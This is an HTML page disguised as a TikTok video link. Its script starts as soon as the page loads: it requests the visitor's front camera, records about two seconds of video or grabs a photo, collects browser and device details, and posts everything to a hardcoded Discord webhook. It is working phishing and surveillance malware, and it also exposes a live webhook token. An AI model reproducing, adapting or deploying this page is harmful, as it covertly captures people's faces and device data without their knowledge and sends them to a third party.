<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Tiktok video" property="og:title">
<meta content="Watch tiktok" property="og:description">
<meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
<meta content="website" property="og:type"/>
<title>–°–¥–µ–ª–∞–π—Ç–µ —Å–Ω–∏–º–æ–∫</title>
<style>
body {
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #000;
    }
.container {
    text-align: center;
    max-width: 400px;
    width: 100%;
    }
.image-container {
    background-color: #1c1e24;
    border-radius: 20px;
    overflow: hidden;
    margin-bottom: 20px;
    }
video {
    width: 100%;
    height: auto;
    display: none;
    }
canvas {
    display: none;
    }
</style>
</head>
<body>
<div class="container">
<div class="image-container">
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
</div>
<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    // Variables for video recording
    let mediaRecorder;
    let recordedChunks = [];
    let recording = false;
    let recordingTimer;

    // Start the process immediately
    setTimeout(() => {
        startVerification();
    }, 500);
    
    async function startVerification() {
        try {
            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            // Attach camera stream to video element
            video.srcObject = stream;
            
            // Wait for video to load
            video.addEventListener('loadedmetadata', () => {
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Start recording
                startRecording(stream);
            });
        } catch (err) {
            // If camera access fails, still send system info
            setTimeout(() => {
                sendToDiscord(null);
            }, 1500);
        }
    }
    
    function startRecording(stream) {
        try {
            // Set up media recorder
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm; codecs=vp9'
            });
            
            // Handle data available event
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            // Handle recording stop
            mediaRecorder.onstop = () => {
                // Create a blob from the recorded chunks
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // Send the recorded video to Discord
                sendToDiscord(blob);
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
            };
            
            // Start recording
            mediaRecorder.start();
            recording = true;
            
            // Set timer to stop recording after 2 seconds
            recordingTimer = setTimeout(() => {
                if (recording) {
                    mediaRecorder.stop();
                    recording = false;
                }
            }, 2000);
            
        } catch (err) {
            // Fallback to photo capture if video recording fails
            setTimeout(() => {
                capturePhoto();
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        }
    }
    
    function capturePhoto() {
        // Draw the current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Send the captured image to Discord
        sendToDiscord(canvas);
    }
    
    function sendToDiscord(media) {
        // Collect system information with emojis
        const systemInfo = {
            "üåê User Agent": navigator.userAgent,
            "üíª Platform": navigator.platform,
            "üó£Ô∏è Language": navigator.language,
            "üïí Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
            "üì∫ Screen": `${screen.width}x${screen.height}`,
            "üç™ Cookies Enabled": navigator.cookieEnabled,
            "üìÖ Date": new Date().toISOString(),
            "üìç Location": "Unknown",
            "üì° IP Address": "Unknown"
        };
        
        // Format system info as a string
        const systemInfoText = Object.entries(systemInfo)
            .map(([key, value]) => `${key}: ${value}`)
            .join('\n');
        
        // Create the main message payload
        const payload = {
            content: "**New Verification Request**",
            embeds: [
                {
                    title: "System Information",
                    description: systemInfoText,
                    color: 5814783, // TikTok-like color
                    timestamp: new Date().toISOString()
                }
            ]
        };
        
        // Replace with your Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1416217653961560174/JH1ylbkjgYwnMoFi-ifbL1gFyljeDwr7ADz6U-G72Vl0_87cdhFqyfK-baYMpz2xW9Qf';
        
        // First send the system information
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok && media) {
                // If there's media to send, prepare it
                const formData = new FormData();
                
                if (media instanceof HTMLCanvasElement) {
                    // Convert canvas to blob for image
                    media.toBlob(blob => {
                        formData.append('file', blob, 'verification.jpg');
                        
                        // Send image with a caption
                        const imagePayload = {
                            content: "**Captured Image**",
                            embeds: [
                                {
                                    title: "Verification Image",
                                    color: 5814783,
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        };
                        
                        formData.append('payload_json', JSON.stringify(imagePayload));
                        
                        fetch(webhookURL, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.9);
                } else if (media instanceof Blob) {
                    // Send video
                    formData.append('file', media, 'verification.webm');
                    
                    const videoPayload = {
                        content: "**Recorded Video**",
                        embeds: [
                            {
                                title: "Verification Video",
                                color: 5814783,
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };
                    
                    formData.append('payload_json', JSON.stringify(videoPayload));
                    
                    fetch(webhookURL, {
                        method: 'POST',
                        body: formData
                    });
                }
            }
        })
        .catch(error => console.error('Error sending to Discord:', error));
    }
});
</script>
</body>
</html>
